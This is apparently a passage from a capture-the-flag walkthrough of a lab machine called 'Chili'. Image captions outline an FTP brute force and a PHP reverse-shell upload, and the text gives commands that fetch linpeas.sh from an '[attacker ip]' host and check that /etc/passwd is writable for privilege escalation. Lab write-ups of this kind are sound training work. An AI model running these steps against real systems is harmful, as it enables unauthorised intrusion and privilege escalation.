...
![Chili netdiscover](/images/Chili1.png)
...
![Chili threader3000 nmap](/images/Chili2.png)
...
![Chili website](/images/Chili3.png)
...
![Chili Hydra brute force](/images/Chili4.png)
...
![Chili ftp access](/images/Chili5.png)
...
![Chili ftp html directory](/images/Chili6.png)
...
![Chili Reverse PHP Shell modification](/images/Chili7.png)
...
![Chili ftp upload reverse shell](/images/Chili8.png)
...
![Chili nc listener](/images/Chili9.png)
...
![Chili chmod reverse-shell.php](/images/Chili10.png)

![Chili webpage reverse PHP shell](/images/Chili11.png)
...
![Chili www-data foothold](/images/Chili12.png)
...
![Chili attacker python http server](/images/Chili13.png)

Next, from your foothold as www-data, run `cd /tmp`, `wget http://[attacker ip]:8000/linpeas.sh`, and finally, `chmod +x linpeas.sh`. The **/tmp** folder is used as it is typically writeable by any user, the 2nd command downloads the script from your attacker machine, and the 3rd one makes it executable. 

![Chili linpeas.sh](/images/Chili14.png)

Now, run `./linpeas.sh` and review the results. After review, it appears that we can write to the **/etc/passwd** file.

![Chili linpeas.sh output](/images/Chili15.png)

Next, let's run `cd /etc` followed by `ls -al|grep passwd` to confirm we have write access to this file. It appears that we do.

![Chili /etc/passwd](/images/Chili16.png)
